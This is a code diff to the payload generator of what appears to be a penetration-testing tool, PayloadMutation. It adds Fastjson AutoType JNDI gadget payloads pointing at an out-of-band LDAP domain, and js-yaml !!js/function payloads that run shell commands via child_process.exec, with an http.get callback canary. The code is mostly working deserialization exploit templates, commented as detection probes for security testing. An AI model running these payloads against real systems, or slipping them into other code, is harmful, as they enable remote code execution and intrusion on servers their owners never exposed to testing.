@@ -95,6 +95,8 @@ class PayloadMutation:
             return self._mutate_wrapper()
         if self.probe == "jackson_manual":
             return self._mutate_jackson_oob()
+        if self.probe == "fastjson_manual":
+            return self._mutate_fastjson_oob()
         return []
 
 
@@ -308,6 +310,45 @@ class PayloadMutation:
 
         return results
 
+
+    # Fastjson 1.x AutoType JNDI gadgets — PLAIN objects {"@type":"com.X",...}, NOT Jackson's
+    # wrapper-array. JdbcRowSetImpl/JndiRefForwardingDataSource/JndiDataSourceFactory perform a
+    # JNDI lookup on the attacker-controlled ldap:// URL, which resolves OOB. Like Jackson, this
+    # confirms AutoType deserialization but is NOT full RCE on its own (needs a rogue LDAP server
+    # returning a Reference + a hosted malicious class, which this tool does not run).
+    FASTJSON_OOB_GADGETS = [
+        ("com.sun.rowset.JdbcRowSetImpl",
+         '{{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{domain}/a","autoCommit":true}}'),
+        ("com.mchange.v2.c3p0.JndiRefForwardingDataSource",
+         '{{"@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"ldap://{domain}/a","loginTimeout":"0"}}'),
+        ("org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
+         '{{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",'
+         '"properties":{{"data_source":"ldap://{domain}/a"}}}}'),
+    ]
+
+    def _mutate_fastjson_oob(self) -> Mutations:
+        oob_domain = get_oob_domain()
+        if not oob_domain:
+            return [{
+                "error": "No OOB domain configured",
+                "hint": "Set 'oob_domain' in config.json (or ETHICALQUOC_OOB_DOMAIN) to your Interactsh/Burp Collaborator subdomain",
+            }]
+
+        results: Mutations = []
+        for gadget_class, template in self.FASTJSON_OOB_GADGETS:
+            raw = template.format(domain=oob_domain)
+            b64 = base64.b64encode(raw.encode()).decode()
+            payload = self._make_payload("fastjson_oob", gadget_class, None, b64)
+            payload["payload_raw"] = raw
+            payload["note"] = (
+                f"Fastjson AutoType confirmation only — check {oob_domain}'s interaction log for "
+                "an inbound LDAP/DNS callback. Does NOT achieve RCE by itself: a real exploit "
+                "additionally needs a rogue LDAP/RMI server returning a Reference plus a hosted "
+                "malicious class, which this tool does not provide or run"
+            )
+            results.append(payload)
+
+        return results
 
 
     PHPGGC_PATH = get_tool_path("phpggc")
@@ -825,11 +866,59 @@ class PayloadMutation:
     YAML_TEST_COMMANDS = TEST_COMMANDS
 
     def _mutate_yaml(self) -> Mutations:
+        if "js-yaml" in self.etype.lower() or "js function" in self.etype.lower():
+            return self._mutate_yaml_node()
         if "java" in self.etype.lower():
             return self._mutate_yaml_java()
         if "ruby" in self.etype.lower():
             return self._mutate_yaml_ruby()
         return self._mutate_yaml_python()
+
+    def _mutate_yaml_node(self) -> Mutations:
+        """js-yaml load() uses DEFAULT_FULL_SCHEMA (unsafe; js-yaml 3.x, or 4.x with the full
+        schema) which rebuilds a REAL JS function from !!js/function. The function is not
+        self-invoking — a vulnerable app that calls the deserialized value (a plugin/hook/callback
+        loader) triggers it. Local command variants to probe in-band, plus a blind OOB canary
+        (pure 'http' module) when an OOB domain is configured. safeLoad()/js-yaml>=4 default reject
+        !!js/function, so this fires only against the unsafe load() path."""
+        # js-yaml rebuilds the function with `new Function(...)`, so it runs in GLOBAL scope where
+        # the module-scoped `require` is NOT defined. The canonical js-yaml RCE primitive reaches
+        # the loader through `global.process.mainModule.require` instead (bare require() throws
+        # ReferenceError and the hook is silently dropped).
+        results: Mutations = []
+        for cmd in self.NODEJS_TEST_COMMANDS:
+            raw = (
+                "hook: !<tag:yaml.org,2002:js/function> "
+                f'"function(){{ return global.process.mainModule.require(\'child_process\').exec(\'{cmd}\'); }}"'
+            )
+            b64 = base64.b64encode(raw.encode()).decode()
+            payload = self._make_payload("yaml_js_function", "js-yaml !!js/function", cmd, b64)
+            payload["payload_raw"] = raw
+            payload["note"] = (
+                "Requires target to use js-yaml load()/DEFAULT_FULL_SCHEMA (unsafe) AND to invoke "
+                "the deserialized function (plugin/hook/callback loader). safeLoad()/js-yaml>=4 reject it. "
+                "Uses global.process.mainModule.require (the function runs in new-Function global scope "
+                "where bare require is undefined)"
+            )
+            results.append(payload)
+
+        oob_domain = get_oob_domain()
+        if oob_domain:
+            url = f"http://{oob_domain}/"
+            raw = (
+                "hook: !<tag:yaml.org,2002:js/function> "
+                f'"function(){{ return global.process.mainModule.require(\'http\').get(\'{url}\'); }}"'
+            )
+            b64 = base64.b64encode(raw.encode()).decode()
+            payload = self._make_payload("yaml_js_function_oob", "js-yaml !!js/function: http.get", url, b64)
+            payload["payload_raw"] = raw
+            payload["note"] = (
+                f"Blind OOB canary — js-yaml load() rebuilds the function; when the app invokes it the "
+                f"target fetches {url} (pure 'http' module, no shell/curl needed). Check the collector "
+                "log for a callback on this vector's token to confirm the sink executed."
+            )
+            results.append(payload)
+        return results
 
     def _mutate_yaml_python(self) -> Mutations:
         results: Mutations = []
